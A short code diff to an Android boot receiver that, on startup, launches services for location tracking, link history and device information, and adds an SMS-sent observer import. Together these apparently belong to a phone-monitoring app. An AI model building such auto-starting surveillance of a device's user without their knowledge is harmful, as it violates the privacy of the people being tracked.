@@ -8,11 +8,13 @@ import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
+import android.net.Uri;
 import android.preference.PreferenceManager;
 
 import com.inet.android.history.LinkService;
 import com.inet.android.info.GetInfo;
 import com.inet.android.location.LocationTracker;
+import com.inet.android.sms.SmsSentObserver;
 import com.inet.android.utils.Logging;
 
 public class BootBroadcastReceiver extends BroadcastReceiver {
@@ -20,13 +22,13 @@ public class BootBroadcastReceiver extends BroadcastReceiver {
 	Context mContext;
 	private final String BOOT_ACTION = "android.intent.action.BOOT_COMPLETED";
 	SharedPreferences sp;
+
 	@Override
 	public void onReceive(Context context, Intent intent) {
 		Logging.doLog("BootBroadCastReceiver", "onReceive", "onReceive");
 		mContext = context;
-		sp = PreferenceManager
-				.getDefaultSharedPreferences(context);
-	
+		sp = PreferenceManager.getDefaultSharedPreferences(context);
+
 		String action = intent.getAction();
 		if (action.equalsIgnoreCase(BOOT_ACTION)) {
 			// for Service
@@ -34,8 +36,9 @@ public class BootBroadcastReceiver extends BroadcastReceiver {
 			context.startService(linkServiceIntent);
 			Intent locServiceIntent = new Intent(context, LocationTracker.class);
 			context.startService(locServiceIntent);
+			
 			GetInfo getInfo = new GetInfo(mContext);
-			getInfo.getInfo();
+			getInfo.startGetInfo();
 		}
 	}
 
